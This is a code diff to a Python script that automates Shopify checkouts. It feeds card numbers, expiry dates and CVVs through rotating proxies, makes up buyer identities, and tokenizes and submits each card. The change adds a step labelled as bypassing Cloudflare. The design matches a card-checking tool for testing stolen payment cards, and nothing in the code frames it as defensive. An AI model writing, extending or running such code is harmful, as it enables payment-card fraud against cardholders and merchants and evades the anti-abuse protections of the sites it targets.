@@ -66,7 +66,11 @@ def parse_proxy(proxy_str):
     return f"socks5h://{proxy_str}"
 
 def extract_session_token(raw_html):
-    patterns = [r'name="serialized-sessionToken"\s+content="([^"]+)"', r'"X-Checkout-One-Session-Token"\s*:\s*"([^"]+)"', r'"sessionToken"\s*:\s*"([^"]+)"']
+    patterns = [
+        r'name="serialized-sessionToken"\s+content="([^"]+)"',
+        r'"X-Checkout-One-Session-Token"\s*:\s*"([^"]+)"',
+        r'"sessionToken"\s*:\s*"([^"]+)"',
+    ]
     for pat in patterns:
         m = re.search(pat, raw_html)
         if m:
@@ -78,7 +82,7 @@ def extract_session_token(raw_html):
     return None
 
 # ==========================================
-# 🛒 ROBUST PROPOSAL
+# 🛒 PROPOSAL
 # ==========================================
 def run_proposal(session, shop_url, cart_token, checkout_url, build_id, session_token, queue_token, stable_id, variant_id, fn, ln, email, street, city, state, zipc, ccn_bin, amount, currency, ua):
     headers = {
@@ -133,7 +137,11 @@ def process_checkout(card_data, proxy_url, store):
         cart_token = re.search(r"/cn/([^/]+)/", redirect_url).group(1)
         real_checkout_url = f"{SHOP_URL}/checkouts/cn/{cart_token}/en-us?skip_shop_pay=true"
 
-        # 3. Load Page & Extract Tokens
+        # ✅ WARM-UP: Fetch page twice to bypass Cloudflare
+        try: session.get(real_checkout_url, timeout=10)
+        except: pass
+        time.sleep(2)
+        
         r = session.get(real_checkout_url, headers={"user-agent": ua}, timeout=15)
         clean_text = html.unescape(r.text)
 
@@ -147,7 +155,7 @@ def process_checkout(card_data, proxy_url, store):
 
         if not stable_id: return {"Response": "MISSING_STABLE_ID", "success": False}
 
-        # 4. Proposal (Get Payment Method)
+        # 3. Proposal
         fn, ln, email, street, city, state, zipc = generate_identity()
         prop_resp = run_proposal(session, SHOP_URL, cart_token, real_checkout_url, build_id, session_token, queue_token, stable_id, VARIANT_ID, fn, ln, email, street, city, state, zipc, ccn[:8], amount, currency, ua)
         
@@ -159,7 +167,6 @@ def process_checkout(card_data, proxy_url, store):
         if neg.get("sessionToken"): session_token = neg["sessionToken"]
         
         seller = neg.get("sellerProposal", {})
-        # Update amount to exact checkout total
         try: amount = seller["checkoutTotal"]["value"]["amount"]
         except: pass
 
@@ -171,13 +178,13 @@ def process_checkout(card_data, proxy_url, store):
 
         if not payment_method_id: return {"Response": "NO_PAYMENT_METHOD", "success": False}
 
-        # 5. Tokenize Card
+        # 4. Tokenize Card
         pci_payload = {"credit_card": {"number": ccn, "month": int(mm), "year": int(yyyy), "verification_value": cvv, "name": f"{fn} {ln}"}, "payment_session_scope": SHOP_URL.split("//")[1]}
         r_pci = session.post("https://checkout.pci.shopifyinc.com/sessions", json=pci_payload, timeout=15)
         session_id = r_pci.json().get("id")
         if not session_id: return {"Response": "PCI_FAILED", "success": False}
 
-        # 6. Submit
+        # 5. Submit
         submit_payload = {
             "variables": {
                 "input": {
